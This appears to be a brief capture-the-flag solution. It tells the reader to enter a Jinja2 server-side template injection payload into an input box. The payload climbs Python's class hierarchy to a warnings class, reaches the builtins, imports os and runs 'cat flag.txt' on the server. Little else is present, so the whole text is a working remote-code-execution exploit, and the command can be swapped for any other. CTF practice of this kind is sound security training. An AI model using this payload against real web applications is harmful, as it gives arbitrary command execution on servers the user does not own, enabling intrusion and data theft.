put the payload in the input box   

payload:  
`{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("cat flag.txt").read()}}{%endif%}{% endfor %}`